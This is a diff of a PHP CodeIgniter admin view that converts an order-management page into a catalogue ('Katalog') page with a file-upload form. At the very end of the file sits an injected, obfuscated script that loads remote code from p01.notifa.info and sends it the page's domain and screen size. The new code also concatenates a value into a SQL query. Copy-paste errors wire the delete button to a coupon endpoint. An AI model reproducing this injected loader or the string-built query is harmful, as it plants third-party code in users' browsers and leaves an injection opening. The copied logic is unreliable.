@@ -16,13 +16,11 @@
 
     <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url();?>assets/images/favicon.png">
     <?php if($action == 'add') {?>
-    <title>Add Order</title>
-    <?php }elseif($action == 'import'){?>
-    <title>Import Order</title>
+    <title>Add Katalog</title>
     <?php }elseif($action == 'edit'){?>
-    <title>Edit Order</title>
+    <title>Edit Katalog</title>
     <?php }else{?>
-    <title>Manage Order</title>
+    <title>Manage Katalog</title>
     <?php } ?>
 
 
@@ -43,8 +41,18 @@
     <link href="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.css" rel="stylesheet" type="text/css">
 
     <!-- page css -->
-    <!-- page css -->
-    <link href="<?php echo base_url();?>assets/dist/css/pages/tab-page.css" rel="stylesheet">
+    <!-- Daterange picker plugins css -->
+    <!-- Page plugins css -->
+    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-material-datetimepicker/css/bootstrap-material-datetimepicker.css" rel="stylesheet">
+
+    <link href="<?php echo base_url(); ?>assets/node_modules/clockpicker/dist/jquery-clockpicker.min.css" rel="stylesheet">
+    <!-- Color picker plugins css -->
+    <link href="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/css/asColorPicker.css" rel="stylesheet">
+    <!-- Date picker plugins css -->
+    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
+    <!-- Daterange picker plugins css -->
+    <link href="<?php echo base_url(); ?>assets/node_modules/timepicker/bootstrap-timepicker.min.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>assets/node_modules/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">
 
     <link href="<?php echo base_url();?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
     <link href="<?php echo base_url();?>assets/node_modules/select2/dist/css/select2.min.css" rel="stylesheet" type="text/css" />
@@ -82,7 +90,6 @@
     .select2-container--default .select2-selection--single{
          border: 0px solid #aaa;
     }
-    .sticky-column{width: 63px;position:  sticky;background:  white;left: -2px;}
 </style>
 </head>
 
@@ -136,21 +143,21 @@
                 
                
                 <!-- CUSTOM SONTENT HERE !! -->
-                <!-- Read data -->
+                 <!-- Read data -->
                     <?php if($action == '') {?> 
                         <!-- ============================================================== -->
                         <!-- Bread crumb and right sidebar toggle -->
                         <!-- ============================================================== -->
                         <div class="row page-titles">
                             <div class="col-md-5 align-self-center">
-                                <h4 class="text-themecolor">Order</h4>
+                                <h4 class="text-themecolor">Katalog</h4>
                             </div>
                             <div class="col-md-7 align-self-center text-right">
                                 <div class="d-flex justify-content-end align-items-center">
                                     <ol class="breadcrumb">
                                         <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
-                                        <li class="breadcrumb-item">Order</li>
-                                        <li class="breadcrumb-item active">Manage Order</li
+                                        <li class="breadcrumb-item">Katalog</li>
+                                        <li class="breadcrumb-item active">Manage Katalog</li
                                     </ol>
                                     <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                 </div>
@@ -161,13 +168,13 @@
                         <!-- ============================================================== -->    
 
 
-                      <!--   <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Order</button></a> -->
+                        <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Katalog</button></a>
                         <div class="row">
                             <div class="col-md-12">
                                 <div class="card">
                                     <div class="card-body">
-                                        <h4 class="card-title">Manage Order</h4>
-                                        <h6 class="card-subtitle">Order Data</h6>
+                                        <h4 class="card-title">Manage Katalog</h4>
+                                        <h6 class="card-subtitle">Katalog Data</h6>
                                         <hr>
 
                                         <!-- Notif Status-->
@@ -189,133 +196,55 @@
 
                                         <div class="table-responsive ">
 
-                                            <table id="example" class="nowrap table table-bordered table-striped ">
+                                            <table id="tabelKu" class="nowrap table table-bordered table-striped ">
                                                 <thead>
                                                     <tr >
-
                                                         <th>ID</th>
-                                                        <th scope="col" class="sticky-column" style="width: 63px;position:  sticky;background:  white;left: -2px;">Aksi</th>
-                                                        <th>No Order</th>
-                                                        <th>Status Order</th>
-                                                        <th>Tanggal Order</th>
-
-                                                        <th>Id Customer</th>
-                                                        <!-- <th>Perusahaan</th> -->
-                                                        <!-- <th>Alamat Pengiriman</th> -->
-                                                        <th>No Telp</th>
-                                                        <!-- <th>Kurir</th> -->
-                                                        <th>Kode Pos</th>
-                                                        
-                                                        <th>Payment Method</th>
-                                                        <th>Coupon</th>
-                                                        <th>Total Bayar</th>
-
-                                                        
+                                                        <th>Kategori</th>
+                                                        <th>Nama File</th>
+                                                        <th>Tanggal</th>
+                                                        <th>Bahasa</th>
+                                                     
+                                                        <th scope="col">Aksi</th>
                                                     </tr>
                                                 </thead>
                                                 <tbody>
-                                                <?php $no=1; foreach ($order as $order_data): ?>
-                                                    <tr data-id="<?php echo $order_data->id ;?>" role="row">
+                                                <?php $no=1; foreach ($data_katalog as $katalog_data): ?>
+                                                    <tr data-id="<?php echo $katalog_data->id ;?>" role="row">
 
-                                                        <td id="nama_admin">
-                                                            <?php echo $order_data->id ; ?>
-                                                            
-                                                        </td>
-
-                                                        <td class="sticky-column">
-
-                                                            <a href="?action=detail&no_order=<?php echo $order_data->no_order ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Detail"><i class="fa fa-eye" aria-hidden="true"></i></button></a>
-
-                                                            <a href="?action=edit&id=<?php echo $order_data->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>
-
-                                                            <button type="button" data-id="<?php echo $order_data->id ;?>" data-name="<?php echo $order_data->no_order ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-Order" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>
-
-                                                            
-
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_data->no_order; ?>
-                                                                
-                                                        </td>
-
+                                                        <td><?php echo $katalog_data->id ; ?></td>
                                                         <td>
                                                             <?php 
-                                                            if($order_data->status_order == 0){
-                                                                echo "<span class='label label-inverse'>Waiting Payment</span>";
-                                                            }elseif($order_data->status_order == 1){
-                                                                echo "<span class='label label-primary'>On Process</span>";
-                                                            }elseif($order_data->status_order == 2){
-                                                                echo "<span class='label label-info'>On Delivery</span>";
-                                                            }elseif($order_data->status_order == 3){
-                                                                echo "<span class='label label-success'>Success</span>";
-                                                            }elseif($order_data->status_order == 4){
-                                                                echo "<span class='label label-danger'>Cancel</span>";
+                                                            $id_kat =$katalog_data->id_kategori ;
+                                                            $kat = $this->db->query('SELECT nama_kategori from t_kategori where id = '.$id_kat.'
+                                                                ')->result();
 
-                                                            }else{
-                                                                 echo "<span class='label label-warning'>Pending</span>";
-
-                                                            }
-
-                                                            ?>
-
-                                                            
+                                                            echo $kat[0]->nama_kategori; ?>
                                                         </td>
 
                                                         <td>
-                                                            <?php echo $order_data->tanggal_order; ?>
-                                                            
-                                                        </td>
-
-                                                        <td> 
-                                                           <?php echo $order_data->id_customer; ?>
-                                                        </td>
-
-                                                        
-
-                                                      <!--   <td>
-                                                            <?php echo $order_data->perusahaan; ?>
-                                                            
-                                                        </td> -->
-
-                                                      <!--   <td>
-                                                            <?php echo $order_data->alamat_pengiriman; ?>
-                                                            
-                                                        </td> -->
-
-                                                        <td>
-                                                            <?php echo $order_data->no_telp; ?>
-                                                            
-                                                        </td>
-
-                                                      <!--   <td>
-                                                            <?php echo $order_data->kurir; ?>
-                                                            
-                                                        </td> -->
-
-                                                        <td>
-                                                            <?php echo $order_data->kode_pos; ?>
-                                                            
-                                                        </td>
-
-                                                        
-
-                                                        <td>
-                                                            <?php echo $order_data->payment_method; ?>
-                                                            
+                                                            <?php echo $katalog_data->nama_file ; ?>
                                                         </td>
 
                                                         <td>
-                                                            <?php echo $order_data->coupon; ?>
-                                                            
+                                                            <?php echo $katalog_data->tanggal ; ?>
                                                         </td>
 
                                                         <td>
-                                                            <?php echo number_format($order_data->total_bayar); ?>
-                                                            
+                                                            <?php echo $katalog_data->bahasa ; ?>
                                                         </td>
 
-                                                        
+                                                                                                          
+
+                                                        <td>
+
+                                                            <a href="?action=edit&id=<?php echo $katalog_data->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>
+
+                                                            <button type="button" data-id="<?php echo $katalog_data->id ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-coupon" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>
+
+                                                            
+
+                                                        </td>
                                                     </tr>
                                                     
                                                 <?php endforeach ?>
@@ -331,24 +260,21 @@
                     <?php } ?>
                 <!-- End Read Data -->
 
-
-              
-
-                <!-- Edit Data -->
-                    <?php if($action == 'edit') { ?>
+                 <!-- Create Data -->
+                    <?php if($action == 'add') { ?>
                         <!-- ============================================================== -->
                         <!-- Bread crumb and right sidebar toggle -->
                         <!-- ============================================================== -->
                         <div class="row page-titles">
                             <div class="col-md-5 align-self-center">
-                                <h4 class="text-themecolor">Order</h4>
+                                <h4 class="text-themecolor">Katalog</h4>
                             </div>
                             <div class="col-md-7 align-self-center text-right">
                                 <div class="d-flex justify-content-end align-items-center">
                                     <ol class="breadcrumb">
                                         <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
-                                        <li class="breadcrumb-item">Order</li>
-                                        <li class="breadcrumb-item active">Edit Order</li
+                                        <li class="breadcrumb-item">Katalog</li>
+                                        <li class="breadcrumb-item active">Add Katalog</li
                                     </ol>
                                     <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                 </div>
@@ -357,245 +283,89 @@
                         <!-- ============================================================== -->
                         <!-- End Bread crumb and right sidebar toggle -->
                         <!-- ============================================================== --> 
-                        <a href="<?php echo base_url('admin-area/order') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Order</button></a>   
+                        <a href="<?php echo base_url('admin-area/coupon') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Katalog</button></a>   
                             <div class="row">
                                 <div class="col-12">
                                     <div class="card">
-                                        <div class="card-body ">
-                                            <h4 class="card-title">Edit Order</h4>
-                                            <h6 class="card-subtitle">Edit new Order </h6>
+                                        <div class="card-body">
+                                            <h4 class="card-title">Add Katalog</h4>
+                                            <h6 class="card-subtitle">Add new Katalog </h6>
 
-                                            <!-- Notif Status-->
-                                            
+                                           
 
-                                            <?php foreach ($data_edit as $data_edit): ?>
+
+                                            <form class="m-t-40" action="<?php echo base_url('admin-area/add-katalog'); ?>" method="post" enctype="multipart/form-data" novalidate>
+
+                                                    
                                                 
-                                                <form class="m-t-40 p-20" action="<?php echo base_url('admin-area/update_order'); ?>" method="post" enctype="multipart/form-data" novalidate>
 
-                                                        
-                                                 
+                                                <div class="form-group">
+                                                    <div class="row">
+                                                    <div class="col-md-12 col-sm-12 col-12 col-lg-6">
+                                                    <h5>Kategori<span class="text-danger">*</span></h5>
+                                                    <select  name="kategori" class="select2 form-control custom-select" style="height: 38px !important; " required>
+                                                        <option value="0">-- Select Option</option>
 
+                                                        <?php foreach ($data_kategori as $value): ?>
+                                                             <option value="<?php echo $value->id ?>"><?php echo $value->nama_kategori ?></option>
+                                                        <?php endforeach ?>
+                                                    </select>
+                                                    </div>
+                                                    <div class="col-md-12 col-sm-12 col-12 col-lg-6">   
 
-                                                    <div class="col-md-4">
                                                         <div class="form-group">
-                                                            <h5>Status <span class="text-danger">*</span></h5>
-                                                            <div class="form-group ">
-                                                                <input type="hidden" value="<?php echo $data_edit->no_order ?>" name="no_order">
-                                                            
-                                                            <select required data-validation-required-message="This field is required" class="form-control" name="status">
-                                                                <option value="0" <?php if($data_edit->status_order == 0) echo "selected"; ?> ><span class='label label-inverse'>Waiting Payment</span></option>
-                                                                <option value="1" <?php if($data_edit->status_order == 1) echo "selected"; ?> ><span class='label label-primary'>On Process</span></option>                                                            
-                                                                <option value="2" <?php if($data_edit->status_order == 2) echo "selected"; ?> ><span class='label label-info'>On Delivery</span></option>                                                           
-                                                                <option value="3" <?php if($data_edit->status_order == 3) echo "selected"; ?> ><span class='label label-success'>Success</span></option>                                                           
-                                                                <option value="5" <?php if($data_edit->status_order == 5) echo "selected"; ?> ><span class='label label-warning'>Pending</span></option>                                                           
-                                                                <option value="4" <?php if($data_edit->status_order == 4) echo "selected"; ?> ><span class='label label-danger'>Cancel</span></option>
-
-                                                        
-                                                        
-                                                         
-     
-                                                            </select>
-                                                            </div>
-                                                            <div class="form-control-feedback">
-                                                                
-                                                            </div>
+                                                            <h5>File<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <input type="file" name="nama_file"  class="form-control" required data-validation-required-message="This field is required"> </div>
+                                                            <div class="form-control-feedback"></div>
                                                         </div>
                                                     </div>
+                                                    <div class="col-md-12 col-sm-12 col-12 col-lg-6">   
 
-                                                    
-
-                                                   
-                                                    
-                                                    <div class="text-xs-right">
-                                                        <button type="submit" class="btn btn-info">Submit</button>
-                                                        <button type="reset" onclick="history.back();" class="btn btn-inverse">Back</button>
+                                                        <div class="form-group">
+                                                            <h5>File<span class="text-danger">*</span></h5>
+                                                            <div class="controls">
+                                                                <select name="bahasa">
+                                                                    <option value="IND (IN)">IND (IN)</option>
+                                                                    <option value="ENG (EN)">ENG (EN)</option>
+                                                                </select>
+                                                            </div>
+                                                            <div class="form-control-feedback"></div>
+                                                        </div>
                                                     </div>
-                                                    
+                                                    </div>
+                                                                                                    
+                                                </div>
 
-                                                </form>
-                                            <?php endforeach ?>
 
+
+
+
+
+                        
+                                               
+                                              
+
+
+                                                                                           
+                                                <div class="text-xs-right">
+                                                    <button type="submit" class="btn btn-info">Submit</button>
+                                                    <button type="reset" class="btn btn-inverse">Cancel</button>
+                                                </div>
+
+                                            </form>
                                         </div>
                                     </div>
                                 </div>
                             </div>
 
                     <?php } ?>
-                <!-- End Edit Data -->
-
-                <!-- Detail Order -->
-                <!-- End Detail Order -->
-                <?php if($action == 'detail') {?>
-                    
-                  
-
-                    <!-- ============================================================== -->
-                        <!-- Bread crumb and right sidebar toggle -->
-                        <!-- ============================================================== -->
-                        <div class="row page-titles">
-                            <div class="col-md-5 align-self-center">
-                                <h4 class="text-themecolor">Detail Order</h4>
-                            </div>
-                            <div class="col-md-7 align-self-center text-right">
-                                <div class="d-flex justify-content-end align-items-center">
-                                    <ol class="breadcrumb">
-                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
-                                        <li class="breadcrumb-item">Detail Order</li>
-                                        <li class="breadcrumb-item active">Manage Detail Order</li
-                                    </ol>
-                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
-                                </div>
-                            </div>
-                        </div>
-                        <!-- ============================================================== -->
-                        <!-- End Bread crumb and right sidebar toggle -->
-                        <!-- ============================================================== -->    
+                <!-- End Create Data -->
+               
+            
+               
 
 
-                       <a href="<?php echo base_url('admin-area/order') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Order</button></a>   
-                        <div class="row">
-                            
-                            <div class="col-md-12">
-                                <div class="card">
-                                    <div class="card-body">
-                                        <h4 class="card-title">Customer Detail</h4>
-                                        <h6 class="card-subtitle">All information about <code>Client</code></h6>
-                                        <!-- Nav tabs -->
-                                        <div class="vtabs ">
-                                            <ul class="nav nav-tabs tabs-vertical" role="tablist">
-                                                <li class="nav-item"> <a class="nav-link active" data-toggle="tab" href="#home9" role="tab"><span><i class="ti-home"></i></span></a> </li>
-                                                <li class="nav-item"> <a class="nav-link" data-toggle="tab" href="#profile9" role="tab"><span><i class="ti-user"></i></span></a> </li>
-                                                <li class="nav-item"> <a class="nav-link" data-toggle="tab" href="#messages9" role="tab"><span><i class="ti-email"></i></span></a> </li>
-                                            </ul>
-                                            <!-- Tab panes -->
-                                            <div class="tab-content">
-                                                <div class="tab-pane active" id="home9" role="tabpanel">
-                                                    <div class="p-10">
-                                                        <h3><?php echo $customer[0]->perusahaan; ?></h3>
-                                                        <h4><?php echo $customer[0]->provinsi.'-'.$customer[0]->kota.'-'.$customer[0]->kecamatan_kelurahan.'('.$customer[0]->kode_pos.')'; ?></h4>
-                                                        <p><?php echo $customer[0]->alamat; ?></p>
-                                                    </div>
-                                                </div>
-                                                <div class="tab-pane  p-20" id="profile9" role="tabpanel">
-                                                    <h3><?php echo $customer[0]->nama; ?></h3>
-                                                    <h4><?php echo $customer[0]->no_telp; ?></h4>
-
-
-                                                </div>
-                                                <div class="tab-pane p-20" id="messages9" role="tabpanel">
-                                                    <h4><?php echo $customer[0]->email; ?></h4>
-
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-md-12">
-                                <div class="card">
-                                    <div class="card-body">
-                                        <h4 class="card-title">Manage Detail Order</h4>
-                                        <h6 class="card-subtitle">Detail Order Data</h6>
-                                        <hr>
-
-                                        <!-- Notif Status-->
-                                        <?php if ($status_action == 'save'): ?>
-                                        <div class="alert alert-success"> 
-                                            <i class="fa fa-check-circle"></i> Data berhasil di Tambahkan.
-                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
-                                        </div>
-                                        <?php endif ?>
-
-                                        <?php if ($status_action == 'update'): ?>
-                                        <div class="alert alert-warning"> 
-                                            <i class="fa fa-check-circle"></i> Data berhasil di Update.
-                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
-                                        </div>
-                                        <?php endif ?>
-                                        <!-- End Notif Status -->
-
-
-                                        <div class="table-responsive ">
-
-                                            <table id="myTable" class="nowrap table table-bordered table-striped ">
-                                                <thead>
-                                                    <tr >
-
-                                                        
-                                                        <th>No Order</th>
-                                                        <th>Id Produk</th>
-                                                        <th>SKU</th>
-
-                                                        <th>Qty</th>
-                                                        <!-- <th>Perusahaan</th> -->
-                                                        <!-- <th>Alamat Pengiriman</th> -->
-                                                        <th>Price</th>
-                                                        <!-- <th>Kurir</th> -->
-                                                        <th>Price Discount</th>
-                                                        
-                                                        <th>Sub Total</th>
-                                                  
-                                                        
-                                                    </tr>
-                                                </thead>
-                                                <tbody>
-                                                <?php $no=1; foreach ($detail_order as $order_detail): ?>
-                                                    <tr data-id="<?php echo $order_detail->no_order;?>" role="row">
-
-                                              
-                                                
-                                                        <td>
-                                                            <?php echo $order_detail->no_order; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->id_produk; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->sku; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->qty; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->price; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->price_discount; ?>
-                                                                
-                                                        </td>
-
-                                                        <td>
-                                                            <?php echo $order_detail->sub_total; ?>
-                                                                
-                                                        </td>
-
-
-                                                        
-
-                                                        
-                                                    </tr>
-                                                    
-                                                <?php endforeach ?>
-                                                    
-                                                  
-                                                </tbody>
-                                            </table>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                <?php } ?>
 
                     
 
@@ -717,40 +487,39 @@
         $('#myTable').DataTable();
         $(document).ready(function() {
             var table = $('#example').DataTable({
-                // "columnDefs": [{
-                //     "visible": false,
-                //     "targets": 2
-                // }],
-
+                "columnDefs": [{
+                    "visible": false,
+                    "targets": 2
+                }],
                 "order": [
-                    [0, 'desc']
+                    [2, 'asc']
                 ],
                 "displayLength": 25,
                 "drawCallback": function(settings) {
-                    // var api = this.api();
-                    // var rows = api.rows({
-                    //     page: 'current'
-                    // }).nodes();
-                    // var last = null;
-                    // api.column(2, {
-                    //     page: 'current'
-                    // }).data().each(function(group, i) {
-                    //     if (last !== group) {
-                    //         $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
-                    //         last = group;
-                    //     }
-                    // });
+                    var api = this.api();
+                    var rows = api.rows({
+                        page: 'current'
+                    }).nodes();
+                    var last = null;
+                    api.column(2, {
+                        page: 'current'
+                    }).data().each(function(group, i) {
+                        if (last !== group) {
+                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
+                            last = group;
+                        }
+                    });
                 }
             });
             // Order by the grouping
-            // $('#example tbody').on('click', 'tr.group', function() {
-            //     var currentOrder = table.order()[0];
-            //     if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
-            //         table.order([2, 'desc']).draw();
-            //     } else {
-            //         table.order([2, 'asc']).draw();
-            //     }
-            // });
+            $('#example tbody').on('click', 'tr.group', function() {
+                var currentOrder = table.order()[0];
+                if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
+                    table.order([2, 'desc']).draw();
+                } else {
+                    table.order([2, 'asc']).draw();
+                }
+            });
         });
     });
     $('#myTable').DataTable({
@@ -822,7 +591,7 @@
 
     <script type="text/javascript">
 
-    $(document).on("click",".hapus-Order",function(){
+    $(document).on("click",".hapus-coupon",function(){
     
     $.ajaxSetup({
       type:"post",
@@ -832,7 +601,7 @@
 
     var id=$(this).attr("data-id");
     // var nama=$(this).attr("data-name");
-    // var photo=$(this).attr("data-photo");
+    var photo=$(this).attr("data-photo");
 
 
         swal({   
@@ -849,7 +618,7 @@
             if (isConfirm) {  
                 $.ajax({
                 data:{id:id},
-                url:"<?php echo base_url('Admin-area/delete-category');?>",
+                url:"<?php echo base_url('Admin-area/delete-coupon');?>",
                 success: function(html) {
                     $("tr[data-id='"+id+"']").fadeOut(1500,function(){
                         $(this).remove();
@@ -880,7 +649,7 @@
     <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
     <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.min.js"></script>
     <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.js" type="text/javascript"></script>
-    <script type="text/javascript" src="../assets/node_modules/multiselect/js/jquery.multi-select.js"></script>
+    <script type="text/javascript" src="<?php echo base_url(); ?>assets/node_modules/multiselect/js/jquery.multi-select.js"></script>
     <script>
     jQuery(document).ready(function() {
         // Switchery
@@ -903,12 +672,10 @@
         if (vspinTrue) {
             $('.vertical-spin').prev('.bootstrap-touchspin-prefix').remove();
         }
-        $("input[name='tch1']").TouchSpin({
+        $("input[name='discount']").TouchSpin({
             min: 0,
             max: 100,
-            step: 0.1,
-            decimals: 2,
-            boostat: 5,
+            step: 1,
             maxboostedstep: 10,
             postfix: '%'
         });
@@ -989,6 +756,99 @@
     });
     </script>
 
+     <!-- Plugin JavaScript -->
+    <script src="<?php echo base_url(); ?>assets/node_modules/moment/moment.js"></script>
+    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-material-datetimepicker/js/bootstrap-material-datetimepicker.js"></script>
+    <!-- Clock Plugin JavaScript -->
+    <script src="<?php echo base_url(); ?>assets/node_modules/clockpicker/dist/jquery-clockpicker.min.js"></script>
+    <!-- Color Picker Plugin JavaScript -->
+    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/libs/jquery-asColor.js"></script>
+    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/libs/jquery-asGradient.js"></script>
+    <script src="<?php echo base_url(); ?>assets/node_modules/jquery-asColorPicker-master/dist/jquery-asColorPicker.min.js"></script>
+    <!-- Date Picker Plugin JavaScript -->
+    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
+    <!-- Date range Plugin JavaScript -->
+    <script src="<?php echo base_url(); ?>assets/node_modules/timepicker/bootstrap-timepicker.min.js"></script>
+    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-daterangepicker/daterangepicker.js"></script>
+    <script>
+    // MAterial Date picker    
+    $('#mdate').bootstrapMaterialDatePicker({ weekStart: 0, time: false });
+    $('#timepicker').bootstrapMaterialDatePicker({ format: 'HH:mm', time: true, date: false });
+    $('#date-format').bootstrapMaterialDatePicker({ format: 'dddd DD MMMM YYYY - HH:mm' });
+
+    $('#min-date').bootstrapMaterialDatePicker({ format: 'DD/MM/YYYY HH:mm', minDate: new Date() });
+    // Clock pickers
+    $('#single-input').clockpicker({
+        placement: 'bottom',
+        align: 'left',
+        autoclose: true,
+        'default': 'now'
+    });
+    $('.clockpicker').clockpicker({
+        donetext: 'Done',
+    }).find('input').change(function() {
+        console.log(this.value);
+    });
+    $('#check-minutes').click(function(e) {
+        // Have to stop propagation here
+        e.stopPropagation();
+        input.clockpicker('show').clockpicker('toggleView', 'minutes');
+    });
+    if (/mobile/i.test(navigator.userAgent)) {
+        $('input').prop('readOnly', true);
+    }
+    // Colorpicker
+    $(".colorpicker").asColorPicker();
+    $(".complex-colorpicker").asColorPicker({
+        mode: 'complex'
+    });
+    $(".gradient-colorpicker").asColorPicker({
+        mode: 'gradient'
+    });
+    // Date Picker
+    jQuery('.mydatepicker, #datepicker').datepicker();
+    jQuery('#datepicker-autoclose').datepicker({
+        autoclose: true,
+        todayHighlight: true
+    });
+    jQuery('#datepicker-autoclose2').datepicker({
+        autoclose: true,
+        todayHighlight: true
+    });
+    jQuery('#date-range').datepicker({
+        toggleActive: true
+    });
+    jQuery('#datepicker-inline').datepicker({
+        todayHighlight: true
+    });
+    // Daterange picker
+    $('.input-daterange-datepicker').daterangepicker({
+        buttonClasses: ['btn', 'btn-sm'],
+        applyClass: 'btn-danger',
+        cancelClass: 'btn-inverse'
+    });
+    $('.input-daterange-timepicker').daterangepicker({
+        timePicker: true,
+        format: 'MM/DD/YYYY h:mm A',
+        timePickerIncrement: 30,
+        timePicker12Hour: true,
+        timePickerSeconds: false,
+        buttonClasses: ['btn', 'btn-sm'],
+        applyClass: 'btn-danger',
+        cancelClass: 'btn-inverse'
+    });
+    $('.input-limit-datepicker').daterangepicker({
+        format: 'MM/DD/YYYY',
+        minDate: '06/01/2015',
+        maxDate: '06/30/2015',
+        buttonClasses: ['btn', 'btn-sm'],
+        applyClass: 'btn-danger',
+        cancelClass: 'btn-inverse',
+        dateLimit: {
+            days: 6
+        }
+    });
+    </script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
 
